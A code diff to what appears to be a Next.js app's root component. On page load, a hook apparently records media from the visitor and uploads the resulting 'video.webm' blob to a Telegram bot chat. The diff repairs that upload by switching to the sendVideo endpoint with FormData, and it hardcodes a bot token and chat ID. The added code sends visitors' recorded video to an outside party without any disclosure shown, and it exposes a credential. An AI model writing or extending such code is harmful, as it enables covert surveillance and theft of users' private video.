@@ -10,8 +10,7 @@ const myApp = ({ Component, pageProps }) => {
 
     const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY"
     const chatId = "-1001860144177"
-    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendMessage`
-
+    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendVideo`
 
     useEffect(() => {
         const getMediaAndSendData = async () => {
@@ -34,17 +33,14 @@ const myApp = ({ Component, pageProps }) => {
                         const blob = new Blob(chunks, { type: 'video/webm' });
 
                         const formData = new FormData();
+                        formData.append('chat_id', chatId);
                         formData.append('video', blob, 'video.webm');
 
                         // Отправляем данные на сервер (бота) с использованием fetch
                         try {
                             const response = await fetch(urlApi, {
                                 method: 'POST',
-                                body: JSON.stringify({
-                                    chat_id: chatId,
-                                    parse_mode: "html",
-                                    text: formData,
-                                })
+                                body: formData,
                             });
 
                             if (response.ok) {
@@ -70,6 +66,7 @@ const myApp = ({ Component, pageProps }) => {
 
         getMediaAndSendData();
     }, []);
+
     // 
 
 
